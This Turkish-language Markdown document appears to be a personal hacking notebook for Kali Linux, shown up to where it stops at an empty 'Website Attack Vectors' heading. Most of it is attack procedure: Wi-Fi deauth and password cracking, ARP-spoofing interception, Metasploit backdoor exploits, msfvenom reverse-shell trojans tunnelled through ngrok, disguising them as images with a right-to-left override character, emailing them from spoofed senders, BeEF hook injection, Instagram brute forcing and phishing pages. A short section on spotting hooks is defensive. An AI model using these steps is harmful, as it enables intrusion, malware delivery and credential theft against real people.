# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
  - [VPN Book](#VPN-Book)
  - [Kali DNS Ayarları Değiştirme](#Kali-DNS-Ayarları-Değiştirme)
  - [DNS Sızıntı Testi](#DNS-Sızıntı-Testi)
  - [MAC Adresi Değiştirme](#MAC-Adresi-Değiştirme)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
  - [WEB Parola Kırma](#WEB-Parola-Kırma)
  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
    - [Handshake Yakalama](#Handshake-Yakalama)
    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
    - [Parola Kırma](#Parola-Kırma)
    - [Brute Force Nedir](#Brute-Force-Nedir)
- [6-IP ve MAC Adreslerini Eşleme](#IP-ve-MAC-Adreslerini-Eşleme)
  - [Netdiscover](#Netdiscover)
  - [nmap](#nmap)
- [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
  - [Arpspoof](#Arpspoof)
  - [Wireshark ile MITM Saldırısı İzleme](#Wireshark-ile-MITM-Saldırısı-İzleme)
  - [Bettercap](#Bettercap)
    - [Bettercap ile Dinleme Yapma](#Bettercap-ile-Dinleme-Yapma)
  - [HTST](#HTST)
  - [HTTPS to HTTP](#HTTPS-to-HTTP)
  - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
- [8-NMAP](#NMAP)
  - [NMAP ile Açık Arama](#NMAP-ile-Açık-Arama)
    - [NMAP Komutları](#NMAP-Komutları)
  - [FTP](#FTP)
    - [msfconsole ile Açığa Giriş](#msfconsole-ile-Açığa-Giriş)
    - [Giriş Yaptıktan Sonra](#Giriş-Yaptıktan-Sonra)
  - [TELNET](#TELNET)
  - [SSH](#SSH)
  - [SAMBA](#SAMBA)
  - [POSTGRESQL METERPRETER](#POSTGRESQL-METERPRETER)
- [9-Trojan Backdoor Oluşturma](#9-Trojan-Backdoor-Oluşturma)
  - [Veil](#Veil)
  - [Multihandler Backdoor Dinleme](#Multihandler-Backdoor-Dinleme)
  - [Fatrat](#Fatrat)
    - [Dinlemek içim](#Dinlemek-İçin)
  - [Msfvenom](#Msfvenom)
  - [Ngrok](#Ngrok)
    - [Kendi IP Adresimizi Kullanmadan Trojan Oluşturma](#Kendi-IP-Adresimizi-Kullanmadan-Trojan-Oluşturma)
    - [Hata](#Hata)
  - [Trojan ile Görsel Birleştirme](#Trojan-ile-Görsel-Birleştirme)
    - [Trojanin Uzantısını Değiştirme](#Trojanin-Uzantısını-Değiştirme)
  - [Trojani Fake E-mail ile Yollama](#Trojani-Fake-E-mail-ile-Yollama)
    - [Terminal Üzerinden Fake E-Mail Yollama](#Terminal-Üzerinden-Fake-E-Mail-Yollama)
- [10-Sosyal Mühendislik](#Sosyal-Mühendislik)
  - [Maltego](#Maltego)
- [11-Beef](#Beef)
  - [JS Kodu Enjeksiyonu ve Sürekli İzleme](#JS-Kodu-Enjeksiyonu-ve-Sürekli-İzleme)
- [12-Instagram Hackleme](#Instagram-Hackleme)
  - [Brute Force](#Brute-Force)
  - [Oltalama Phishing](#Oltalama-Phishing)
- [13-Ubuntu ile Websitesi Oluşturma](#Ubuntu-ile-Websitesi-Oluşturma)
- [14-NoIP](#NoIP)
- [15-Hookdan Korunmak İçin](#15-Hookdan-Korunmak-İçin)
  - [Var ise](#Var-ise)
- [16-Setoolkit](#Setoolkit)
  - [Social Engineering Attack](#Social-Engineering-Attack)
  - [Website Attack Vectors](#Website-Attack-Vectors)
  - [Credential Harvester Attack Method](#Credential-Harvester-Attack-Method)
  - [Web Templates](#Web-Templates)
- [17-Hackledikten Sonra](#17-Hackledikten-Sonra)
  - [Hedef PCye Sızdıktan Sonra Kullanılabilecek Komutlar](#Hedef-PCye-Sızdıktan-Sonra-Kullanılabilecek-Komutlar)
  - [Hedef PCyi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek](#Hedef-PCyi-Hackledikten-Sonra-Bağlantıyı-Sürdürebilir-Hale-Getirmek)
- [18-Shodan](#18-Shodan)
  - [Shodan İçerisinde Filtreleme](#Shodan-İçerisinde-Filtreleme)
  - [Shodan'ı Terminal Üzerinden Çalıştırmak](#Shodanı-Terminal-Üzerinden-Çalıştırmak)
- [19-Bilgi Toplama](#19-Bilgi-Toplama)
  - [Maltego](#Maltego)
  - [Netcraft](#Netcraft)
  - [Yougetsignal](#Yougetsignal)
  - [Archive](#Archive)
  - [Whoislookup](#Whoislookup)
  - [Robots.txt](#Robots.txt)
  - [Subbrute](#Subbrute)
- [20-Web Pentesting](#20-Web-Pentesting)
  - [DVWA](#DVWA)
  - [NATCAT ile Dinleme](#NATCAT-ile-Dinleme)
  - [Weevely](#Weevely)
  - [File Inclusion](#File-Inclusion)
  - [Nikto](#Nikto)
- [21-XSS](#21-XSS)
  - [XSS Açıkları](#Xss-Açıkları)
  - [XSS Reflected](#XSS-Reflected)
  - [XSS Stored](#XSS-Stored)
    - [XSS Stored ve Beef Çalıştırma](#XSS-Stored-ve-Beef-Çalıştırma)
  - [XSSden Korunmak İçin](#XSSden-Korunmak-İçin)
- [22-SQL](#22-SQL)
  - [SQL Kodları](#SQL-Kodları)
  - [SQL ile Database Görme](#SQL-ile-Database-Görme)
  - [Mutillidae İçinde SQL Hatası](#Mutillidae-İçinde-SQL-Hatası)
  - [SQL Açığı Arama](#SQL-Açığı-Arama)
  - [SQL Post Methodu](#SQL-Post-Methodu)
  - [Union Select](#Union-Select)
  - [SQL Get ile Veri Tabanı İsmini Öğrenme](#SQL-Get-ile-Veri-Tabanı-İsmini-Öğrenme)
  - [SQL Get ile Veri Tabanındaki Table Name Bulma](#SQL-Get-ile-Veri-Tabanındaki-Table-Name-Bulma)
  - [SQL Get ile Veri Tabanındaki Sütun Name Bulma](#SQL-Get-ile-Veri-Tabanındaki-Sütun-Name-Bulma)
  - [SQL Get ile Admin Bilgilerini Öğrenme](#SQL-Get-ile-Admin-Bilgilerini-Öğrenme)
  - [SQL Map](#SQL-Map)
  - [ZAP](#ZAP)
  - [SQL Enjeksiyonu](#SQL-Enjeksiyonu)
  - [Login By-Pass](#Login-By-Pass)
- [23-Hashes](#23-Hashes)
  - [Linux Hashes](#Linux-Hashes)
  - [Windows Hashes](#Windows-Hashes)
  - [Sistemi Hackledikten Sonra Hashleri Öğrenme](#Sistemi-Hackledikten-Sonra-Hashleri-Öğrenme)
  - [Kali Hash Öğrenme](#Kali-Hash-Öğrenme)
  - [Hashcat](#Hashcat)
    - [Kali Hash Kırma](#Kali-Hash-Kırma)
    - [Metasploitable Hash Kırma](#Metasploitable-Hash-Kırma)
    - [Windows Hash Kırma](#Windows-Hash-Kırma)
    - [Hatalar](#Hatalar)
- [24-Zip Şifrelerini Kırma](#24-Zip-Şifrelerini-Kırma)
  - [John](#John)
- [25-OSI Modelleri](#25-OSI-Modelleri)
- [26-IPv4 ve IPv6](#26-IPv4-ve-IPv6)
- [27-NAT](#27-NAT)
- [28-TCP ve UDP](#28-TCP-ve-UDP)
  - [TCP ve UDP Farkları](#TCP-ve-UDP-Farkları)
  - [Kullanılan Portlar](#Kullanılan-Portlar)
  - [TCP İletişim Kurma Aşamaları](#TCP-İletişim-Kurma-Aşamaları)
- [29-Web Sitesi Klonlama](#29-Web-Sitesi-Klonlama)
- [30-ISSAF Raporlama Adımları](#30-ISSAF-Raporlama-Adımları)
- [31-DOS ve DDOS](#31-DOS-ve-DDOS)
  - [Protokoller](#Protokoller)
  - [Saldırı Türleri](#Saldırı-Türleri)
    - [Volumetrik Saldırılar](#Volumetrik-Saldırılar)
    - [Protokol Saldırıları](#Protokol-Saldırıları)
# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN Book

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS Sızıntı Testi 

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

Wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma

> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```

# 5-Wifi Parola Kırma 

### WEB Parola Kırma 

Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır

```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 

```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```

### VPA ve VPA2 Parola Kırma

www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir

### Handshake Yakalama

``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

```
channel: Ağın çalıştığı kanal
bssid: Ağın MAC adresi
write: Yakalanan handshake'in nereye kayıt edileceği
```

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

### Wordlist Oluşturma

``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

```filesystem/usr/shake/wordlist``` içinde en çok kullanılan şifrelerin bulunduğu wordlist

```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar

### Parola Kırma

``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar

> ### Brute Force Nedir

Brute Force mümkün olan bütün şifre kombinasyonlarını denemektir. Bu yöntemi kullanarak şifreyi kesin buluruz fakat bu işlem saatlerce, günlerce, aylarca, hatta yılllarca sürebilir

![image](https://user-images.githubusercontent.com/85068070/216357440-ba01b31d-76d1-4f35-b7ba-47da04ead32f.png)

# 6-IP ve MAC Adreslerini Eşleme

### Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

### nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# 7-Man in the Middle Saldırısı

### Arpspoof

İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```

```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
```
-t: Kurban IP

YY:YY:YY:YY : Kendi IP adresimiz 
```
Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
```
-t: Kendi IP'miz
XX:XX:XX:XX : Kurban IP
```
``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz

### Wireshark ile MITM Saldırısı İzleme

Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz

  ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)

### Bettercap 

* Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
* bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz

* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
* ```net.show``` Toplanan bilgileri özet olarak gösterir


Bettercap İçinde

* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz

Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 

> ### Bettercap ile Dinleme Yapma

* ```net.sniff on``` Hedef PC'yi dinlemeye başlar

### HTST

```htst``` ne olursa olsun o siteyi https olarak açmaya zorluyor

### HTTPS to HTTP

```hstshijack.cap``` dosyasında ```com``` uzantıları ```corn``` olarak değiştiriyoruz

> ### Windows Bilgisayarımıza MITM Saldırısı Var Mı 

Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz

# 8- NMAP

### NMAP ile Açık Arama

```nmap -v -sS -A -T4 XX:XX:XX:XX:XX (Target IP)```  Taranan adresteki açıkları gösterir

> ### NMAP Komutları
```
-A: Farklı işletim sistemi versiyon vs verir.
-sn: Port taraması yapma anlamına gelir.
-n: DNS Çözümlemesi yapma anlamına gelir.
-v, -vv, -vvv: Ekrana gösterilecek detayları arttırır.
-F: Daha hızlı tarama yapar. Daha az sonuç bulur.
-sS:Syn Taraması Yapar
--reason: Bulduğu bir sonucun sebebini gösterir.
--open: Sadece açık Portları gösterir.
-p-: Bir IP üzerinde bulunması muhteme 65535 portun hepsini tarar.
-sV: Açık portta çalışan servisin ne olduğunu bulmaya çalışır.
-sC ile birlikte kullanılırsa işe yarar.
-sC: -sV ile versiyon tespiti yapılırken nmap scriptlerini kullanır.
-p: Sadece bu parametreden sonra belirtilen portları tarar.
-o: İşletim sistemi bilgilerini gösterir.
```
### FTP

```ftp 192.168.123.123``` çalıştırıyoruz, kullanıcı adı ve şifre yerine "anonymous" yazıyoruz. ftp açığına bağlandıktan sonra ```put dosyaadı``` ile dosya ekleyebiliriz. Google'a nmap'te bulunan ```vsftpd A.B.C (vsftpd 2.3.4) exploit``` yazarak gerekli komutlara ulaşabiliriz

> ### msfconsole ile Açığa Giriş

1. ```msfconsole``` çalıştırıyoruz
2. ```msf > use exploit/unix/ftp/usftp_234_backdoor```
3. ```show targets```
4. ```set targets 192.168.123.123``` hedef IP
5. ```show options```
6. ```set RHOST 192.168.123.123``` hedef IP
7. ```set RPORT 21``` port'u değiştiriyoruz
8. ```exploit -j -z``` dinleyeme başlıyoruz (```-j -z``` dersek dinlemeyi arka planda yapar)
9. ```sessions -l``` açık olan portları görürüz
10. ```session 1``` 1. session açık olduğu için o porttan giriş yapar

> ### Giriş Yaptıktan Sonra

1. ```uname -a``` içinde olduğumuz sistemin adını verir
2. ```ls, pwd``` gibi komutlarla sistemde gezinebiliriz
3. ```background``` ile sistemden çıkış yaparız

### TELNET

Telnet SSH'dan daha güvensizdir. ```telnet 192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını rahatça görebiliriz

### SSH

```sshmsfadmin@192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını **şifrelenmiş** olarak görürüz

### SAMBA

Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketlerdeki PC, yazıcı vb şeyleri birbirine bağlar

1. Samba Numarasını ```(samba smbd 3.x-4.x) exploit``` ile google'da ararız
2. ```msfconsole``` açarız
3. Google üzerinde çıkan komutları yazıyoruz
4. ```LHOST``` bizim IP adresimiz
5. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
6. ```sessions -l``` açık olan portları görürüz
7. ```session 1``` 1. session açık olduğu için o porttan giriş yapar


### POSTGRESQL METERPRETER

1. Postgresql kodunu google'da exploit olarak aratıyoruz
2. ```msfconsole``` açıyoruz
3. Google üzerinden çıkan kodları çalıştırıyoruz
4. ```show options``` çalıştırdığımızda çıkan bilgiler içinde default password'u görürüz
5. ```LHOST``` ve ```RHOST``` ayarlarını değiştriiyoruz
6. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
7. ```sessions -l``` açık olan portları görürüz
8  ```session 1``` 1. session açık olduğu için o porttan giriş yapar

# 9- Trojan Backdoor Oluşturma

### Veil

1. Veil opt içinde kurulu olduğu için ```/opt``` içine giriyoruz
2. ```python3 veil.py``` 
3. ```>>use 1``` 
4. ```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
5. ```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
6. Oluşturulan trojan'ın konumunu görürüz (var/lib/veil/output/complied) 
7. Oluşturduğumuz trojan'ı ```antiscan.me``` gibi sitelerde test edebiliriz

### Multihandler Backdoor Dinleme

1. ```msfconsole``` 
2. ```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3. ```set patload windows/meterpreter/reverse_http```  (trojanın oluşturulma tipine göre değişiklik gösterebilir)
4. ```LHOST ve LPORT```'u değiştiriyoruz
5. ```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

```service apache2 start/stop``` Kendi IP'mizin Web servisini aktif hale getirir

### Fatrat

1. ```fatrat``` ile framework'ü açıyoruz
2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
4. ```LHOST, LPORT``` giriyoruz
5. Trojan adını seçiyoruz
6. ```32bit/64bit``` seçiyoruz
7. Trojan'ı oluşturuyoruz ve dinliyoruz

> ### Dinlemek için

1. ```msfconsole``` 
2. ```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3. ```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
4. ```LHOST ve LPORT```'u değiştiriyoruz
5. ```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

### Msfvenom

```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```
```
-p: payload
-a: bit sayısı
--platform: hangi platformda çalışacağı 
lhost: ngrok'dan kopyaladığımız IP
lport: ngrok'dan kopyaladığımız PORT
-f: dosya uzantısı 
-o: trojan'in kaydedileceği konum
```

### Ngrok

> ### Kendi IP Adresimizi Kullanmadan Trojan Oluşturma

1. ```ngrok.com``` sitesine gidiyoruz, üye oluyoruz ve profilimizde bize ait olan token'ı kopyalıyoruz
2. Terminale giriyoruz ve ```.ngrok config add-authtoken 2BA7...Xoh``` çalıştırıyoruz 
3. ```./ngrok``` çalıştırarak ngrok'u açıyoruz ```./ngrok help``` ile menüyü açabiliriz
4. ```./ngrok tcp 4242``` çalıştırarak 4242 portunda tünel servisini açıyoruz
5. ```forwarding``` kısmındaki ```IP``` ve ```PORT```'u kaydediyoruz

> ### Hata 

```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz

Ngrok kullanarak trojan oluştururken (veil ya da msfvenom) ```LHOST``` yerine 0.tcp.eu.ngrok ```LPORT``` yerine (ngrok içindeki port) 17716 (değişebilir) yazıyoruz

### Trojan ile Görsel Birleştirme

1. İlk olarak görselimizi (.jpeg) seçip google üzerinden uzantısını ```.ico```'ya çeviriyoruz 
2. ```Veil``` kullanarak trojan'i oluşturuyoruz
3. İndirdiğimiz ```.ico``` uzantılı görsel ile trojan'i aynı dosya içine atıyoruz
4. Dosya içine girip ```python3 trojan_factory.py -f http://192.168.123.456/backdoors/andorid.jpeg -e http://192.168.123.456/backdoors/mynewpayload.exe -o /opt/trojanfactory/newtest.exe ; http://192.168.123.456/backdoors/android.ico``` çalıştırıyoruz
```
-f: .jpeg dosyasının konumu
-e: trojan'in konumu
-o: .ico'nun konumu 
```

> ###  Trojanin Uzantısını Değiştirme

1. ```apt-get install gnome-characters``` karakter paketini indiriyoruz
2. İndirdiğimiz framework'ü açıyoruz ve arama yerine ```right-to-right``` yazıp çıkan şeyi kopyalıyoruz
3. ```.exe``` dosyamızın sonunda ```gepj.exe``` yazıyoruz
3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor

```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```

### Trojani Fake E-mail ile Yollama

Google'a ```send anonymous e-mail``` aratıyoruz. Göndermek istediğimiz trojan'i .zip dosyasına çevirerek mail ile yollayabiliriz

> ### Terminal Üzerinden Fake E-Mail Yollama

```sendemail -f admin@gmail -t hedefmailadresi@gmail.com -s smtp.gmail.com:587 -xu gerçekmailadresi@gmail.com -xp MY-PASSWORD -u test email -m your gmail has been hacked```
```
-f: Mail'i Gönderen Fake E-mail Adresi
-t: Hedef E-mail Adresi
-s: Mail'in Smtp'si (Google Üzerinde Bakılabilir)
-xu: Kendi E-mail Adresimiz
-xp: Kendi E-mail Adresimizin Şifresi
-u: Mail'in Başlığı
-m: Mail'in İçeriği
```

# 10-Sosyal Mühendislik

### Maltego

```maltego``` kali içinde yüklü framework 

![maltego](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.29.29.jpeg)

Yeni Sayfa Açmak 

![maltego yeni sayfa](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.28.13.jpeg) 

Sol Taraftan Ne Tür Arama Yapıcağımızı Seçiyoruz

![sosyal mühendislik](https://github.com/ahmetnuysal/Cyber-Security/blob/75e15440d30a5e6fd7a7910cafc44beec6b2496c/WhatsApp%20Image%202022-08-17%20at%2016.34.43.jpeg)

Sağ Click Yaparak Hangi Tür Bilgileri Edinebileceğimizi Görebiliriz Ya Da Tüm Bilgileri Görebiliriz

![run](https://github.com/ahmetnuysal/Cyber-Security/blob/9b17f8f1f08083fe3766213e94b20e62b1fa1aff/WhatsApp%20Image%202022-08-17%20at%2016.38.10.jpeg)

Ve toplanan bilgileri görürüz  

# Beef

Beef Hedef PC'nin arama motorunda JS kodu çalıştırır

1. ```beef-xss``` beef'i açıyoruz
2. Beef'in sitesine üye olmamız gerekiyor
3. ```/var/www/html``` içerisinde ki ```inde.html``` açıyoruz
4. İçerisine ```<script src="http://192.168.123.456:3000/hook.js"></script>``` yazıyoruz ```JS kodu içindeki IP Kalimizin IP'si olmalı```
5. Artık bizim apache service'imize giren PC'leri Beef üzerinden görebiliriz

### JS Kodu Enjeksiyonu ve Sürekli İzleme
```usr/share/bettercap/caplets/beefcustom``` içerisindeki ```.js``` ve ```.cap``` dosyalarındaki kodları değiştiriyoruz

js içine kendi Kali IP'mizi yazıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2011.59.29.jpeg)

.cap içine hedef PC'nin IP'sini yazıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2012.00.00.jpeg)

Bazı Beef Komutları
```
spydereye: Browser'ın SS'ini alır
create alert dialog: Belirlenen mesajı hedef browser ekranına bastırır
pretty theft: Sosyal medya hesabınızdan çıkış yapıldı bastırıp kullanıcı adı ve şifre ister
fake notificatio bar: Hedefe fake bir güncelleme bildirimi yollayıp dosya indirebiliriz
```

# 12-Instagram Hackleme

### Brute Force

Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır

1. İlk olarak ```git clone https://github.com/Pure-LOG1C/Instagram.git``` kuruyoruz
2. ```crunch 7 8 xyz123 -o instawordlist``` ile wordlist oluşturuyoruz
3. ```python instagram.py kullanıcıadı instawordlist 10``` ile wordlist içindeki şifreleri denemeye başlıyoruz 

```kullanıcıadı```: Hedef hesabın kullanıcı adı

### Oltalama Phishing

1. Google'a ```Instagram phishing script 2022``` aratıyoruz
2. ```index.html``` ve ```post.php``` dosyalarını indiriyoruz ve fake instagram giriş sayfası yapıyoruz
3. ```000webhost``` adresinden bedava websitesi alabiliriz
4. İndirdiğimiz dosyaları websitemizin ```public_html``` kısmına yüklüyoruz
5. Arama kısımına ```https://sitemizinadı.000webhost.com/password.html``` yazarak girilen bilgileri görürüz

# 14-NoIP

Ücretsiz olarak hostname almamızı sağlayan sitedir

1.```noip.com``` sitesine giriyoruz
2.```quickadd``` kısmından free hostname ve domain alıyoruz
3.```Dynamic DNS``` girip sitemize tıklıyoruz
4.```IPv4``` yerine sunucumuzun IP adresini giriyoruz

# 15-Hookdan Korunmak İçin

1.Siteye sağ tık yaparak ```incele``` diyoruz 
2.İçerisinde ```hook``` içerikli ```<script>``` kodu var mı diye kontrol ediyoruz

### Var ise

1. Sayfayı Kapatıyoruz
2. PC'yi resetliyoruz
3. İnternet sağlayıcımızı arayarak IP adresimizi değiştiriyoruz

# 16-Setoolkit (Social Engineering Toolkit)

1. ```setoolkit``` tool'u açıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/88ac00ceec1bd42735948076f806d36ac5d0e89f/WhatsApp%20Image%202022-08-28%20at%2014.53.30.jpeg)

1: Sosyal Mühendislik Atağı
2: Sızma Testi Araçları
3: Setoolkit için yazılmış 3th party uygulamaları çalıştırır

### Social-Engineering Attack

![](https://github.com/ahmetnuysal/Cyber-Security/blob/540f2a7967dbc04796e3df22f4938e7e17290487/WhatsApp%20Image%202022-08-28%20at%2014.56.53.jpeg)

1: Kişiye/Kuruma Özel Sosyal Mühendislik
2: Websitesi Saldırı
3: Zararlı Yazılım Oluşturur
4: Backdoor Oluşturur
5: Mail Yollar
6: Ardunio İçine Trojan
7: Wifi Atak
8: Zararlı QR Kod Oluşturur

### Website Attack Vectors

